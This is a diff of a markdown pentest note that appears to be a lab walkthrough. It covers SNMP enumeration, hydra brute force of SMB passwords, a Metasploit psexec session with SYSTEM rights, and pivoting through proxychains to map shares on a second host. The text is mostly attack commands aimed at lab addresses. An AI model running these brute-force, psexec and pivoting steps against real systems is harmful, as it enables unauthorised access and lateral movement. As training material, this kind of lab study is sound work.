@@ -1,12 +1,9 @@
 ---
-title: 'SNMP ()'
-description: ''
+title: 'SNMP'
+description: 'Port: 161'
 pubDate: 'Jul 03 2022'
-heroImage: '/'
 tag: ['windows', 'smb']
 ---
-
-Port 161 SNMP
 
 ```bash
 # recolectar informacion
@@ -28,7 +25,6 @@ snmpset -v 2c -c public target_id sysContact.0 s els
 
 nmap --script=snmp-win32-services
 
-
 ```
 
 We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161.
@@ -45,10 +41,7 @@ Note: We will have to double-check nmap results by sending SNMP requests to the 
 
 ### Now, we need to find the SNMP server community string to access the target machine service.
 
-Note: If you are not familiar with SNMP terms like communities, please, take a look at the course material.
-
 We could use nmap snmp-brute script to find the community string. The script uses the snmpcommunities.lst list for brute-forcing it is located inside /usr/share/nmap/nselib/data/snmpcommunities.lst directory.
-
 
 ```bash
 
@@ -69,13 +62,11 @@ An object identifier (OID) may be given on the command line. This OID specifies 
 
 All variables in the subtree below the given OID are queried and their values presented to the user. Each variable name is given in the format specified in variables.
 
-If no OID argument is present, snmpwalk will search the subtree rooted at SNMPv2-SMI::mib-2 (including any MIB object values from other MIB modules, that are defined as lying within this subtree). 
+If no OID argument is present, snmpwalk will search the subtree rooted at: **SNMPv2-SMI::mib-2 (including any MIB object values from other MIB modules, that are defined as lying within this subtree).**
 
 If the network entity has an error processing the request packet, an error packet will be returned and a message will be shown, helping to pinpoint why the request was malformed.
 
 If the tree search causes attempts to search beyond the end of the MIB, the message "End of MIB" will be displayed. Source **https://linux.die.net/man/1/snmpwalk**
-
-We are running the snmpwalk command on the target machine.
 
 ```bash
 snmpwalk -v 1 -c public target_ip_local
@@ -90,7 +81,6 @@ We were able to gather a lot of information via SNMP. But, this isn't in a prope
 
 ### Let's run all the SNMP nmap scripts to gather all possible information via the SNMP service.
 
-
 ```bash
 nmap -sU -p 161 --script snmp-\* target_ip_local > snmp_output
 
@@ -99,19 +89,16 @@ file.
 
 ```
 
-This nmap script scan would take some time. Please wait patiently.
-
 From the list of information retrieved, we found a couple of engaging data, such as running processes, users, services, installed applications, etc.
 
-However, analyzing the results, one absorbing information we could extract is the list of Windows users:
+We could extract is the list of Windows users.
 
-### Now, let's run a brute-force attack using these windows users on SMB service.
+### Let's run a brute-force attack using these windows users on SMB service.
 
 Remember, port 445 is open, and we can run a brute-force attack using the hydra tool.
 
-First, let's save two usernames in a file. i.e administrator and admin
-
 ```bash
+# Saving creds
 hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip_local smb
 
 #The hydra switches are described in the help: hydra -help. However, the most relevant parts of the command are explained below:
@@ -123,16 +110,13 @@ hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwo
 -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
 
-***SMB***
+### SMB
 
 This is the protocol that should be used by hydra to perform the brute-force attack.
-After a couple of minutes, we should see the following results:
-Thus, hydra successfully found a valid password for administrator and admin users.
 
 ### Now, we will run the psexec Metasploit exploit module to gain the meterpreter session using these credentials.
 
 Let's try to get a shell on this system using the PSExec module of the Metasploit framework.
-
 
 ```bash
 msfconsole -q
@@ -153,24 +137,7 @@ exploit
 
 ```
 
-Note: If you don't gain a meterpreter session for some reason, please re-exploit the target.
-
 We have successfully gained the meterpreter session on the target machine.
-
-### Now, let's read the flag.
-
-```powershell
-shell
-cd C:\
-dir
-type FLAG1.txt
-
-# FLAG: a8f5f167f44f4964e6c998dee827110c
-```
-
-We have found the flag!
-
-#####################
 
 ```bash
 ping target_ip_local
@@ -188,7 +155,6 @@ nmap target_ip_local
 Multiple ports are open on the target_ip_local machine.
 
 All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc.
-
 There are multiple versions of the SMB protocol.
 
 - SMB1
@@ -198,7 +164,7 @@ There are multiple versions of the SMB protocol.
 - SMB 3.0.2
 - SMB 3.1.1
 
-***SMBv1:***
+### SMBv1:
 
 Server Message Block (SMB) is an application layer network protocol commonly used in Microsoft Windows to provide shared access to files and printers. SMBv1 is the original protocol developed in the 1980s, making it more than 30 years old. More secure and efficient versions of SMB are available today. 
 
@@ -232,9 +198,6 @@ Microsoft Windows Server 2008 R2 - 2012
 
 ### Now, let's identify all the supported SMB versions on the target machine.
 
-We can quickly identify it using the nmap script
-smb-protocols.
-
 ```bash
 nmap -p445 --script smb-protocols target_ip_local
 -p445
@@ -243,8 +206,6 @@ nmap -p445 --script smb-protocols target_ip_local
 --script smb-protocols
 #: Script Scan
 ```
-We can notice that all three versions are accessible.
-
 There is one more interesting nmap script for the smb protocol to find the security level of the protocol.
 
 ### Let's run the nmap script to find the smb protocol security level.
@@ -265,7 +226,9 @@ If an attacker has valid credentials on the target machine. Then, command execut
 
 Now, let's find that we have the Null Session, i.e Anonymous access on the target machine using the smbclient tool.
 
-smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on. Step 7: Let's run the smbclient tool to find that we have anonymous access on the target machine.
+smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on. 
+
+### Let's run the smbclient tool to find that we have anonymous access on the target machine.
 
 ```bash
 smbclient -L target_ip_local
@@ -282,9 +245,9 @@ Let's find all the present users using nmap smb-enum-users script.
 nmap -p445 --script smb-enum-users.nse target_ip_local
 ```
 
-There are a total of four users present. admin, administrator, root, and guest
+There are a total of four users present. *admin, administrator, root, and guest*.
 
-The guest and administrator users are built-in accounts.
+The *guest* and *administrator* users are built-in accounts.
 
 Now, let's find the valid password for admin,administrator, and root user.
 
@@ -305,15 +268,9 @@ target_ip_local smb
 
 ```
 
-We have successfully retrieved valid passwords for all three users.
-
 ### Now, we can use the Metasploit framework and run the
 
 psexec exploit module to gain the meterpreter shell using the administrator user valid password.
-
-Microsoft Windows Authenticated User Code Execution
-
-Let's start the Metasploit framework and exploit it!
 
 ```bash
 # Note: If the exploit won't give you a meterpreter session. Try again!
@@ -337,17 +294,7 @@ sysinfo
 
 We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.
 
-### Let's read the flag.
-
-```bash
-cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
-#We have found the FLAG1:
-8de67f44f49264e6c99e8a8f5f17110c
-```
-
 ### Let's check if we can access target_ip from the compromised host.
-
-Before, ping to the second target machine from the compromised host. We need to know the IP address for the target_ip host.
 
 Remember, when we did ping to both the targets and discovered IP addresses of these target machines:
 
@@ -364,7 +311,7 @@ ping 10.0.22.69
 #We can access the target_ip machine, i.e., 10.0.22.69.
 ```
 
-However, we cannot access that machine (10.0.22.69) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.
+However, we cannot access that machine *(10.0.22.69)* from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.
 
 ### Let's add the route using the meterpreter session and identify the second machine service.
 
@@ -384,7 +331,7 @@ Socks4a Proxy Server
 
 This module provides a socks4a proxy server with built-in Metasploit routing to relay connections. Source:: **https://www.rapid7.com/db/modules/auxiliary/server/socks4a/**
 
-Note: The proxychains should have configured with the following parameters (at the end of /etc/proxychains4.conf):
+Note: The proxychains should have configured with the following parameters at: *( the end of /etc/proxychains4.conf)*
 
 ```powershell
 cat /etc/proxychains4.conf
@@ -461,7 +408,7 @@ shell
 net view 10.0.22.69
 ```
 
-This time we can see two shared resources. Documents and K drive. And, this confirms that pivot target (target_ip) allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.
+This time we can see two shared resources, this confirms that pivot target (target_ip) allows Null Sessions, so we can access the shared resources.
 
 ### Now, we can map the shared drive to the target_ip machine using the 'net' command.
 
@@ -471,20 +418,3 @@ Let's map the shared resources, i.e., the Documents and K drive.
 net use D: \\10.0.22.69\Documents
 net use K: \\10.0.22.69\K$
 ```
-
-We successfully mapped the resources to D and K drives.
-
-### Let's check what is inside these mapped drives.
-
-```powershell
-dir D:
-dir K:
-```
-
-Now that we can browse the shares content, we can download or read it on the attacker's machine.
-
-Let's read the
-FLAG2
-and
-Confidential.txt
-files.
